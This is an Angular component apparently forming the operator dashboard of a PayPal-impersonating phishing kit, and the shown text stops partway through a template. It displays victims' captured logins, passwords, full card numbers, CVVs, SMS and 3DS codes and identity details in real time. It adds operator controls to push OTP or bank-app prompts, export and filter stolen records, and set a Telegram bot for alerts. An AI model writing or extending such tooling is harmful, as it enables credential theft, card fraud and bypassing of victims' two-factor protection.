
import { Component, inject, computed, signal, effect, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { StateService, SessionHistory } from '../services/state.service';

type AdminTab = 'live' | 'history' | 'settings';

@Component({
  selector: 'app-admin-dashboard',
  standalone: true,
  imports: [CommonModule, FormsModule],
  template: `
    <div class="flex h-[100dvh] flex-col lg:flex-row bg-pp-bg font-sans text-pp-navy overflow-hidden">
      
      <!-- Toast Notification -->
      @if (state.adminToast()) {
          <div class="fixed top-6 right-6 z-[100] bg-pp-navy text-white px-6 py-3 rounded-full shadow-2xl flex items-center gap-3 animate-fade-in">
              <span class="material-icons text-pp-success text-lg">check_circle</span>
              <span class="text-sm font-bold">{{ state.adminToast() }}</span>
          </div>
      }

      <!-- AUTH GUARD -->
      @if (!state.adminAuthenticated()) {
         <div class="absolute inset-0 z-[200] bg-pp-bg flex items-center justify-center p-4">
             <div class="pp-card max-w-[400px]">
                <div class="flex justify-center mb-8">
                     <!-- Simple Text Logo for Admin -->
                     <h1 class="text-3xl font-bold text-pp-navy tracking-tighter">PayPal <span class="text-pp-blue">Admin</span></h1>
                </div>
                <h2 class="text-xl font-bold text-center mb-6">Security Console</h2>
                <div class="space-y-5">
                    <div class="pp-input-group mb-0">
                        <input type="text" [(ngModel)]="loginUser" placeholder=" " class="pp-input peer">
                        <label class="pp-label">Username</label>
                    </div>
                    <div class="pp-input-group mb-0">
                        <input type="password" [(ngModel)]="loginPass" placeholder=" " class="pp-input peer">
                        <label class="pp-label">Password</label>
                    </div>
                    <button (click)="doLogin()" class="pp-btn mt-4">Log In</button>
                    @if(loginError()) { <p class="text-center text-[#D92D20] text-sm font-bold mt-2">Access Denied</p> }
                </div>
             </div>
         </div>
      } @else {

      <!-- SIDEBAR -->
      <aside class="w-full h-16 lg:w-[260px] lg:h-full bg-pp-navy text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0">
           <div class="h-16 lg:h-20 flex items-center lg:px-6 lg:border-b border-[#ffffff10]">
              <span class="font-bold text-xl tracking-tight">PayPal <span class="text-pp-success text-xs align-top">SEC</span></span>
           </div>
           
           <!-- Mobile Nav (Horizontal) -->
           <nav class="flex lg:flex-col items-center lg:items-stretch gap-2 lg:gap-0 lg:py-6">
               <a (click)="activeTab.set('live')" [class.bg-[#ffffff10]]="activeTab() === 'live'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'live'">
                   <span class="material-icons text-[20px]">radar</span>
                   <span class="hidden lg:block">Live Monitor</span>
                   @if(state.activeSessions().length > 0) {
                       <span class="hidden lg:flex ml-auto bg-pp-success text-pp-navy text-[10px] font-bold px-2 py-0.5 rounded-full">{{ state.activeSessions().length }}</span>
                   }
               </a>
               <a (click)="activeTab.set('history')" [class.bg-[#ffffff10]]="activeTab() === 'history'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'history'">
                   <span class="material-icons text-[20px]">history</span>
                   <span class="hidden lg:block">History</span>
               </a>
               <a (click)="activeTab.set('settings')" [class.bg-[#ffffff10]]="activeTab() === 'settings'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'settings'">
                   <span class="material-icons text-[20px]">settings</span>
                   <span class="hidden lg:block">Settings</span>
               </a>
           </nav>

           <div class="hidden lg:block p-4 border-t border-[#ffffff10] mt-auto">
               <button (click)="exitAdmin()" class="flex items-center gap-4 text-white/60 hover:text-white w-full">
                   <span class="material-icons">logout</span>
                   <span class="text-sm font-bold">Log out</span>
               </button>
           </div>

           <button (click)="exitAdmin()" class="lg:hidden text-white/60 hover:text-white">
               <span class="material-icons">logout</span>
           </button>
      </aside>

      <!-- MAIN CONTENT -->
      <main class="flex-1 flex flex-col h-[calc(100dvh-64px)] lg:h-[100dvh] relative bg-pp-bg overflow-hidden">
         
         <!-- Top Bar (Desktop Only) -->
         <header class="hidden lg:flex h-16 bg-white border-b border-slate-200 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
             <div class="flex items-center gap-2">
                 <h1 class="text-lg font-bold text-pp-navy">Administrator Console</h1>
                 @if(state.isOfflineMode()) {
                     <span class="bg-amber-100 text-amber-800 text-[10px] font-bold px-2 py-1 rounded-full uppercase tracking-wider flex items-center gap-1">
                         <span class="material-icons text-[12px]">wifi_off</span> Local Mode
                     </span>
                 }
             </div>
             <div class="flex items-center gap-4">
                 <button (click)="refresh()" class="p-2 text-pp-blue bg-blue-50 rounded-full hover:bg-blue-100 transition-colors" title="Force Refresh">
                     <span class="material-icons text-sm">refresh</span>
                 </button>
                 <div class="w-8 h-8 rounded-full bg-pp-navy text-white flex items-center justify-center font-bold text-xs">A</div>
             </div>
         </header>

         <!-- Content Area -->
         <div class="flex-1 overflow-hidden relative">
            
            @switch (activeTab()) {
                
                <!-- LIVE MONITOR -->
                @case ('live') {
                    <div class="flex flex-col lg:flex-row h-full">
                        
                        <!-- List Column (Fixed Width on Desktop, Top on Mobile) -->
                        <div class="lg:w-[350px] bg-white border-b lg:border-b-0 lg:border-r border-slate-200 flex flex-col shrink-0 h-[300px] lg:h-full">
                             <div class="p-4 border-b border-slate-100 bg-slate-50/50 flex justify-between items-center shrink-0">
                                 <h3 class="font-bold text-base text-pp-navy">Active Sessions</h3>
                                 <span class="bg-pp-blue text-white text-xs px-2 py-1 rounded-md font-bold">{{ state.activeSessions().length }}</span>
                             </div>
                             <div class="flex-1 overflow-y-auto p-2 space-y-2">
                                 @for(session of state.activeSessions(); track session.id) {
                                     <div (click)="selectSession(session)" class="p-3 rounded-[12px] cursor-pointer transition-all border border-transparent group relative"
                                          [class.bg-[#E1F0FA]]="isSelected(session)" [class.border-pp-blue]="isSelected(session)" [class.hover:bg-slate-50]="!isSelected(session)">
                                         
                                         <div class="absolute top-3 right-3 h-2 w-2 rounded-full"
                                            [class.bg-pp-success]="isSessionLive(session)"
                                            [class.bg-slate-300]="!isSessionLive(session)"></div>

                                         <div class="flex flex-col gap-0.5">
                                             <div class="flex items-center gap-2">
                                                <span class="font-bold text-pp-navy font-mono text-xs">{{ session.id }}</span>
                                                @if(session.data?.ipCountry) {
                                                    <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{session.data.ipCountry}}">
                                                }
                                             </div>
                                         </div>
                                     </div>
                                     }
                                     @if(state.activeSessions().length === 0) {
                                         <div class="flex flex-col items-center justify-center h-24 text-slate-400">
                                             <p class="text-xs">No online users</p>
                                         </div>
                                     }
                                 </div>

                             <!-- Incomplete Sessions (Offline but Verified) -->
                             <div class="h-[40%] flex flex-col border-t border-slate-200">
                                 <div (click)="incompleteCollapsed.set(!incompleteCollapsed())" class="p-3 bg-slate-100 border-b border-slate-200 flex justify-between items-center cursor-pointer hover:bg-slate-200 transition-colors">
                                     <div class="flex items-center gap-2">
                                         <span class="material-icons text-slate-400 text-sm transform transition-transform" [class.-rotate-90]="incompleteCollapsed()">expand_more</span>
                                         <h3 class="font-bold text-sm text-slate-600">Incomplete</h3>
                                     </div>
                                     <span class="bg-slate-300 text-slate-700 text-[10px] px-2 py-0.5 rounded-full font-bold">{{ state.incompleteSessions().length }}</span>
                                 </div>

                                 <div class="flex-1 overflow-y-auto p-2 space-y-2 bg-slate-50" [class.hidden]="incompleteCollapsed()">
                                     @for(session of state.incompleteSessions(); track session.id) {
                                         <div (click)="selectSession(session)" class="p-3 rounded-[12px] cursor-pointer transition-all border border-slate-200 bg-white opacity-80 hover:opacity-100"
                                              [class.border-pp-blue]="isSelected(session)" [class.ring-1]="isSelected(session)" [class.ring-pp-blue]="isSelected(session)">

                                             <div class="flex items-center justify-between mb-1">
                                                <span class="font-bold text-slate-500 font-mono text-xs">{{ session.id }}</span>
                                                <span class="text-[10px] font-bold text-slate-400 uppercase">Offline</span>
                                             </div>
                                             <div class="flex flex-col gap-0.5">
                                                 <span class="text-sm font-bold text-slate-700 truncate">{{ getDisplayEmail(session.email) }}</span>
                                                 <div class="flex justify-between items-center mt-2">
                                                     <span class="text-[10px] text-slate-400">{{ session.stage }}</span>
                                                     <button (click)="archiveSession(session, $event)" class="text-[10px] font-bold text-pp-blue hover:underline bg-blue-50 px-2 py-1 rounded">Archive</button>
                                                 </div>
                                             </div>
                                         </div>
                                     }
                                     @if(state.incompleteSessions().length === 0) {
                                         <div class="flex flex-col items-center justify-center h-full text-slate-400">
                                             <p class="text-xs">No incomplete sessions</p>
                                         </div>
                                     }
                                 </div>
                             </div>
                        </div>

                        <!-- Details Column (Flexible, Independent Scroll) -->
                        <div class="flex-1 flex flex-col h-full overflow-hidden bg-[#F9FAFB] relative">
                             @if(monitoredSession()) {
                                 <!-- Header (Sticky) -->
                                 <div class="p-4 lg:p-6 border-b border-slate-100 flex justify-between items-center bg-white shrink-0 z-10 shadow-sm">
                                     <div>
                                         <div class="flex items-center gap-3 mb-1">
                                            <h2 class="font-bold text-lg lg:text-xl text-pp-navy">Session Details</h2>
                                            <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ monitoredSession()?.currentView || monitoredSession()?.stage }}</span>
                                         </div>
                                         <div class="flex items-center gap-2">
                                             <p class="text-xs text-slate-500 font-mono">{{ monitoredSession()?.id }} • {{ monitoredSession()?.fingerprint?.ip }}</p>
                                             @if(monitoredSession()?.data?.ipCountry) {
                                                <img [src]="getFlagUrl(monitoredSession()?.data?.ipCountry)" class="h-3 w-auto shadow-sm" title="Location: {{monitoredSession()?.data?.ipCountry}}">
                                             }
                                         </div>
                                     </div>
                                     <div class="text-right">
                                         <p class="text-[10px] text-slate-400 font-bold uppercase">Time Elapsed</p>
                                         <p class="font-mono font-bold text-pp-blue">{{ elapsedTime() }}</p>
                                     </div>
                                 </div>
                                 
                                 <!-- Scrollable Content -->
                                 <div class="flex-1 overflow-y-auto p-4 lg:p-8 pb-32">
                                     <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                         
                                         <!-- Credentials -->
                                         <div class="bg-white p-6 rounded-[20px] shadow-sm border border-slate-100 relative overflow-hidden group">
                                             <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy">lock</span></div>
                                             <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Login Credentials</h4>
                                             <div class="space-y-4 relative z-10">
                                                 <div>
                                                     <label class="text-[11px] font-bold text-slate-500 block mb-1">Email / Username</label>
                                                     <div class="flex items-center gap-2">
                                                         <p class="text-base font-bold text-pp-navy break-all">{{ monitoredSession()?.data?.email || 'Waiting...' }}</p>
                                                         <button *ngIf="monitoredSession()?.data?.email" (click)="copy(monitoredSession()?.data?.email)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
                                                     </div>
                                                 </div>
                                                 <div>
                                                     <label class="text-[11px] font-bold text-slate-500 block mb-1">Password</label>
                                                     <div class="flex items-center gap-2">
                                                         <p class="text-base font-mono bg-slate-100 px-2 py-1 rounded text-pp-navy border border-slate-200">{{ monitoredSession()?.data?.password || 'Waiting...' }}</p>
                                                         <button *ngIf="monitoredSession()?.data?.password" (click)="copy(monitoredSession()?.data?.password)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
                                                     </div>
                                                 </div>
                                             </div>
                                         </div>

                                         <!-- Financial -->
                                         <div class="bg-white p-6 rounded-[20px] shadow-sm border border-slate-100 relative overflow-hidden group">
                                             <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy">credit_card</span></div>
                                             <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Financial Instrument</h4>
                                             <div class="space-y-4 relative z-10">
                                                 <div>
                                                     <div class="flex items-center justify-between mb-1">
                                                         <label class="text-[11px] font-bold text-slate-500 block">Card Number</label>
                                                         @if(getCardLogoUrl(monitoredSession()?.data?.cardType)) {
                                                             <img [src]="getCardLogoUrl(monitoredSession()?.data?.cardType)" class="h-4 w-auto object-contain">
                                                         }
                                                     </div>
                                                     <div class="flex items-center gap-2">
                                                        <p class="text-lg font-mono font-bold text-pp-navy tracking-wide">{{ formatCard(monitoredSession()?.data?.cardNumber) }}</p>
                                                        <button *ngIf="monitoredSession()?.data?.cardNumber" (click)="copy(monitoredSession()?.data?.cardNumber)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
                                                     </div>
                                                 </div>
                                                 <div class="flex gap-6">
                                                     <div>
                                                         <label class="text-[11px] font-bold text-slate-500 block mb-1">Exp</label>
                                                         <p class="font-bold text-pp-navy">{{ monitoredSession()?.data?.cardExpiry || '--/--' }}</p>
                                                     </div>
                                                     <div>
                                                         <label class="text-[11px] font-bold text-slate-500 block mb-1">CVV</label>
                                                         <p class="font-bold text-[#D92D20]">{{ monitoredSession()?.data?.cardCvv || '---' }}</p>
                                                     </div>
                                                 </div>
                                             </div>
                                         </div>

                                         <!-- OTP & Security -->
                                         <div class="col-span-1 md:col-span-2 bg-pp-navy text-white p-6 rounded-[20px] shadow-lg relative overflow-hidden flex items-center justify-between">
                                              <!-- Background decoration -->
                                              <div class="absolute -right-6 -top-6 w-32 h-32 bg-pp-blue rounded-full opacity-20 blur-2xl"></div>
                                              
                                              <div class="relative z-10">
                                                  <h4 class="text-xs font-bold text-white/60 uppercase tracking-wider mb-3">Security Codes</h4>
                                                  <div class="flex gap-8">
                                                      <div>
                                                          <span class="text-[10px] text-white/50 block mb-1">SMS Code</span>
                                                          <span class="text-2xl font-mono font-bold tracking-widest">{{ monitoredSession()?.data?.phoneCode || '---' }}</span>
                                                      </div>
                                                      <div>
                                                          <span class="text-[10px] text-white/50 block mb-1">Bank 3DS</span>
                                                          <span class="text-2xl font-mono font-bold tracking-widest text-pp-success">{{ monitoredSession()?.data?.cardOtp || '---' }}</span>
                                                      </div>
                                                  </div>
                                              </div>
                                              
                                              @if(monitoredSession()?.stage === 'card_pending') {
                                                <div class="relative z-10 flex gap-2">
                                                    <button (click)="requestFlow('otp')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
                                                        SMS / 3DS
                                                    </button>
                                                    <button (click)="requestFlow('app')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
                                                        Bank App
                                                    </button>
                                                    <button (click)="requestFlow('both')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
                                                        Both
                                                    </button>
                                                </div>
                                              }
                                         </div>
                                         
                                         <!-- Personal Info -->
                                         <div class="col-span-1 md:col-span-2 bg-white p-6 rounded-[20px] shadow-sm border border-slate-100">
                                              <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Identity Profile</h4>
                                              <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                                                  <div>
                                                      <label class="text-[10px] font-bold text-slate-400 uppercase">Name</label>
                                                      <p class="text-sm font-bold text-pp-navy">{{ (monitoredSession()?.data?.firstName + ' ' + monitoredSession()?.data?.lastName).trim() || 'Waiting...' }}</p>
                                                  </div>
                                                  <div>
                                                      <label class="text-[10px] font-bold text-slate-400 uppercase">DOB</label>
                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.dob || 'Waiting...' }}</p>
                                                  </div>
                                                  <div>
                                                      <label class="text-[10px] font-bold text-slate-400 uppercase">Phone</label>
                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.phoneNumber || 'Waiting...' }}</p>
                                                  </div>
                                                  <div>
                                                      <label class="text-[10px] font-bold text-slate-400 uppercase">Location</label>
                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.country || 'Waiting...' }}</p>
                                                  </div>
                                                  <div class="col-span-2">
                                                      <label class="text-[10px] font-bold text-slate-400 uppercase">Address</label>
                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.address || 'Waiting...' }}</p>
                                                  </div>
                                              </div>
                                         </div>

                                     </div>
                                 </div>

                                 <!-- Action Bar (Sticky Bottom) -->
                                 <div class="p-4 border-t border-slate-200 bg-white/90 backdrop-blur-sm absolute bottom-0 left-0 right-0 z-20 flex justify-between items-center shadow-lg">
                                     <div class="flex items-center gap-2">
                                         <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(monitoredSession())" [class.bg-pp-success]="isSessionLive(monitoredSession())" [class.bg-slate-300]="!isSessionLive(monitoredSession())"></span>
                                         <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(monitoredSession()) ? 'Live Connection' : 'Offline' }}</span>
                                     </div>

                                     @if(monitoredSession()) {
                                         <div class="flex gap-2 lg:gap-3">
                                              <!-- Revoke disabled unless login verified -->
                                              <button (click)="revoke()"
                                                      [disabled]="!monitoredSession()?.isLoginVerified"
                                                      [class.opacity-50]="!monitoredSession()?.isLoginVerified"
                                                      [class.cursor-not-allowed]="!monitoredSession()?.isLoginVerified"
                                                      class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
                                                  Revoke
                                              </button>
                                              <button (click)="reject()"
                                                      [disabled]="!canInteract()"
                                                      [class.opacity-50]="!canInteract()"
                                                      [class.cursor-not-allowed]="!canInteract()"
                                                      class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
                                                  Reject
                                              </button>
                                              @if (monitoredSession()?.stage === 'login') {
                                                  <button (click)="approve({ skipPhone: false })"
                                                          [disabled]="!canInteract()"
                                                          [class.opacity-50]="!canInteract()"
                                                          [class.cursor-not-allowed]="!canInteract()"
                                                          class="bg-pp-navy hover:bg-pp-blue text-white px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
                                                      <span class="material-icons text-sm">check</span> Verify Phone
                                                  </button>
                                                  <button (click)="approve({ skipPhone: true })"
                                                          [disabled]="!canInteract()"
                                                          [class.opacity-50]="!canInteract()"
                                                          [class.cursor-not-allowed]="!canInteract()"
                                                          class="bg-pp-blue hover:bg-[#005ea6] text-white px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
                                                      <span class="material-icons text-sm">fast_forward</span> Skip Phone
                                                  </button>
                                              } @else {
                                                  <button (click)="approve()"
                                                          [disabled]="!canInteract()"
                                                          [class.opacity-50]="!canInteract()"
                                                          [class.cursor-not-allowed]="!canInteract()"
                                                          class="bg-pp-navy hover:bg-pp-blue text-white px-6 lg:px-8 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
                                                      <span class="material-icons text-sm">check</span> {{ approveText() }}
                                                  </button>
                                              }
                                         </div>
                                     }
                                 </div>

                             } @else {
                                 <div class="flex-1 flex flex-col items-center justify-center text-slate-300 min-h-[300px]">
                                     <span class="material-icons text-6xl mb-4 opacity-20">touch_app</span>
                                     <p class="text-lg font-bold">Select a session</p>
                                     <p class="text-sm">Choose an active session from the left to monitor.</p>
                                 </div>
                             }
                        </div>
                    </div>
                }

                <!-- HISTORY TAB -->
                @case ('history') {
                    <div class="bg-white rounded-card shadow-sm border border-slate-100 overflow-hidden h-full flex flex-col">

                        <!-- Toolbar -->
                        <div class="px-6 py-4 border-b border-slate-100 bg-slate-50/50 flex flex-col md:flex-row gap-4 items-center justify-between shrink-0">
                            <h3 class="font-bold text-lg text-pp-navy shrink-0 hidden md:block">Session History</h3>

                            <div class="flex flex-col md:flex-row items-center gap-3 w-full md:w-auto">
                                <!-- Bulk Actions -->
                                @if(selectedSessionIds().size > 0) {
                                    <div class="flex items-center bg-pp-navy text-white rounded-lg px-2 py-1 animate-fade-in shadow-lg">
                                        <span class="text-xs font-bold px-2">{{ selectedSessionIds().size }} selected</span>
                                        <div class="h-4 w-px bg-white/20 mx-1"></div>
                                        <button (click)="bulkExport()" class="p-1.5 hover:bg-white/10 rounded transition-colors" title="Export Selected"><span class="material-icons text-sm">download</span></button>
                                        <button (click)="bulkPin()" class="p-1.5 hover:bg-white/10 rounded transition-colors" title="Pin Selected"><span class="material-icons text-sm">push_pin</span></button>
                                        <button (click)="bulkDelete()" class="p-1.5 hover:bg-red-500 rounded transition-colors" title="Delete Selected"><span class="material-icons text-sm">delete</span></button>
                                    </div>
                                }

                                <!-- Filters -->
                                <div class="flex items-center gap-2 w-full md:w-auto">
                                    <div class="relative flex-1 md:w-64">
                                        <span class="material-icons absolute left-3 top-2.5 text-slate-400 text-sm">search</span>
                                        <input type="text" [ngModel]="searchQuery()" (ngModelChange)="searchQuery.set($event)" placeholder="Search sessions..." class="w-full pl-9 pr-4 py-2 text-sm border border-slate-200 rounded-lg focus:outline-none focus:border-pp-blue transition-colors">
                                    </div>

                                    <select [ngModel]="timeFilter()" (ngModelChange)="timeFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 rounded-lg bg-white focus:outline-none focus:border-pp-blue cursor-pointer">
                                        <option value="6h">Last 6 Hours</option>
                                        <option value="24h">Last 24 Hours</option>
                                        <option value="7d">Last 7 Days</option>
                                        <option value="all">All Time</option>
                                        <option value="custom">Custom Range</option>
                                    </select>

                                    <select [ngModel]="countryFilter()" (ngModelChange)="countryFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 rounded-lg bg-white focus:outline-none focus:border-pp-blue cursor-pointer max-w-[120px]">
                                        <option value="all">All Countries</option>
                                        @for(c of uniqueCountries(); track c) {
                                            <option [value]="c">{{ c }}</option>
                                        }
                                    </select>
                                </div>
                            </div>
                        </div>

                        <!-- Custom Date Range (Conditional) -->
                        @if(timeFilter() === 'custom') {
                            <div class="px-6 py-3 bg-slate-100 border-b border-slate-200 flex items-center justify-end gap-3 animate-fade-in">
                                <span class="text-xs font-bold text-slate-500 uppercase">Range:</span>
                                <input type="date" [ngModel]="customDateStart()" (ngModelChange)="customDateStart.set($event)" class="px-2 py-1 text-sm border border-slate-300 rounded">
                                <span class="text-slate-400">-</span>
                                <input type="date" [ngModel]="customDateEnd()" (ngModelChange)="customDateEnd.set($event)" class="px-2 py-1 text-sm border border-slate-300 rounded">
                            </div>
                        }

                        <div class="flex-1 overflow-auto">
                            <table class="w-full text-left border-collapse">
                                <thead class="bg-pp-bg text-slate-500 text-xs font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
                                    <tr>
                                        <th class="px-4 py-4 w-12 text-center">
                                            <input type="checkbox" (change)="toggleAllSelection($event)" [checked]="isAllSelected()" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
                                        </th>
                                        <th class="px-4 py-4">Time</th>
                                        <th class="px-6 py-4">Session ID</th>
                                        <th class="px-6 py-4">Identity</th>
                                        <th class="px-6 py-4">Card Info</th>
                                        <th class="px-6 py-4">Status</th>
                                        <th class="px-6 py-4 text-right">Actions</th>
                                    </tr>
                                </thead>
                                <tbody class="divide-y divide-slate-100 text-sm font-medium">
                                    @for(item of filteredHistory(); track item.id) {
                                        <tr class="hover:bg-slate-50 transition-colors cursor-pointer group" (click)="viewHistory(item)" [class.bg-blue-50]="selectedSessionIds().has(item.id)">
                                            <td class="px-4 py-4 text-center" (click)="$event.stopPropagation()">
                                                <input type="checkbox" [checked]="selectedSessionIds().has(item.id)" (change)="toggleSelection(item.id, $event)" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
                                            </td>
                                            <td class="px-4 py-4 text-slate-500 whitespace-nowrap">{{ item.timestamp | date:'short' }}</td>
                                            <td class="px-6 py-4 text-pp-blue font-bold font-mono">
                                                {{ item.id }}
                                                @if(item.isPinned) { <span class="material-icons text-[12px] text-pp-blue ml-1">push_pin</span> }
                                            </td>
                                            <td class="px-6 py-4">
                                                <div class="flex flex-col">
                                                    <div class="flex items-center gap-2">
                                                        <span class="font-bold text-pp-navy">{{ item.name }}</span>
                                                        @if(item.data?.ipCountry) {
                                                            <img [src]="getFlagUrl(item.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{item.data.ipCountry}}">
                                                        }
                                                    </div>
                                                    <span class="text-xs text-slate-400">{{ item.email }}</span>
                                                </div>
                                            </td>
                                            <td class="px-6 py-4 font-mono text-slate-600">
                                                <div class="flex items-center gap-2">
                                                    @if(getCardLogoUrl(item.data?.cardType)) {
                                                        <img [src]="getCardLogoUrl(item.data.cardType)" class="h-4 w-auto object-contain">
                                                    }
                                                    <span>{{ item.data.cardBin }}...{{ item.data.cardLast4 }}</span>
                                                </div>
                                            </td>
                                            <td class="px-6 py-4">
                                                <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase">{{ item.status }}</span>
                                            </td>
                                            <td class="px-6 py-4 text-right" (click)="$event.stopPropagation()">
                                                <div class="flex items-center justify-end gap-2 opacity-0 group-hover:opacity-100 transition-opacity">
                                                    <button (click)="exportTxt(item)" class="text-slate-400 hover:text-pp-blue transition-colors" title="Export TXT"><span class="material-icons text-lg">download</span></button>
                                                    <button (click)="pinSession(item)" [class.text-pp-blue]="item.isPinned" [class.text-slate-400]="!item.isPinned" class="hover:text-pp-blue transition-colors" title="Pin"><span class="material-icons text-lg">push_pin</span></button>
                                                    <button (click)="deleteSession(item)" class="text-slate-400 hover:text-red-600 transition-colors" title="Delete"><span class="material-icons text-lg">delete</span></button>
                                                </div>
                                            </td>
                                        </tr>
                                    }
                                    @if(filteredHistory().length === 0) {
                                        <tr>
                                            <td colspan="7" class="px-6 py-12 text-center text-slate-400">
                                                <span class="material-icons text-4xl mb-2 opacity-20">search_off</span>
                                                <p>No sessions found matching your filters.</p>
                                            </td>
                                        </tr>
                                    }
                                </tbody>
                            </table>
                        </div>
                    </div>
                }

                <!-- SETTINGS TAB -->
                @case ('settings') {
                    <div class="max-w-2xl mx-auto bg-white rounded-card shadow-sm border border-slate-100 overflow-hidden p-8 animate-fade-in">
                         <h2 class="font-bold text-xl mb-6 text-pp-navy">System Configuration</h2>
                         <div class="space-y-6">
                             <div class="pp-input-group">
                                 <input type="email" [(ngModel)]="settingEmail" placeholder=" " class="pp-input peer">
                                 <label class="pp-label">Alert Notification Email</label>
                                 <p class="text-xs text-slate-500 mt-2 ml-1">New sessions will trigger an alert to this address.</p>
                             </div>

                             <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div class="pp-input-group mb-0">
                                    <input type="text" [(ngModel)]="tgToken" placeholder=" " class="pp-input peer">
                                    <label class="pp-label">Telegram Bot Token</label>
                                </div>
                                <div class="pp-input-group mb-0">
                                    <input type="text" [(ngModel)]="tgChat" placeholder=" " class="pp-input peer">
                                    <label class="pp-label">Telegram Chat ID</label>
                                </div>
                             </div>
                             
                             <div class="pt-4 border-t border-slate-100">
                                 <button (click)="saveSettings()" class="pp-btn">
                                     Save Configuration
                                 </button>
                             </div>
                         </div>
                    </div>
                }
            }
         </div>
      </main>

      <!-- History Slide-out Panel -->
      @if (historyPanelOpen()) {
           <div class="fixed inset-0 z-50 flex justify-end">
               <!-- Backdrop -->
               <div class="absolute inset-0 bg-black/20 backdrop-blur-sm transition-opacity" (click)="closeHistory()"></div>
               <!-- Panel -->
               <div class="relative w-full max-w-2xl bg-white h-full shadow-2xl flex flex-col animate-slide-in-right">
                   <div class="p-6 border-b border-slate-100 flex justify-between items-center bg-slate-50/50">
                       <h2 class="font-bold text-xl text-pp-navy">Session History Details</h2>
                       <button (click)="closeHistory()" class="p-2 hover:bg-slate-200 text-slate-500 rounded-full transition-colors">
                           <span class="material-icons">close</span>
                       </button>
                   </div>
                   <div class="flex-1 overflow-y-auto bg-[#F9FAFB] flex flex-col">
                        <ng-container *ngTemplateOutlet="sessionDetailView; context: {session: selectedHistorySession(), isHistory: true}"></ng-container>
                   </div>
               </div>
           </div>
      }

      <!-- Reusable Session Detail Template -->
      <ng-template #sessionDetailView let-session="session" let-isHistory="isHistory">
            <!-- Header -->
            <div class="p-6 border-b border-slate-100 flex justify-between items-center bg-white/50 shrink-0">
                <div>
                    <div class="flex items-center gap-3 mb-1">
                    <h2 class="font-bold text-xl text-pp-navy">Session Details</h2>
                    <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ session?.stage }}</span>
                    </div>
                    <p class="text-xs text-slate-500 font-mono">{{ session?.id }} • {{ session?.fingerprint?.ip }}</p>
                </div>
                @if(!isHistory) {
                    <div class="text-right">
                        <p class="text-[10px] text-slate-400 font-bold uppercase">Time Elapsed</p>
                        <p class="font-mono font-bold text-pp-blue">{{ elapsedTime() }}</p>
                    </div>
                }
            </div>

            <!-- Scrollable Content -->
            <div class="flex-1 p-6 lg:p-8">
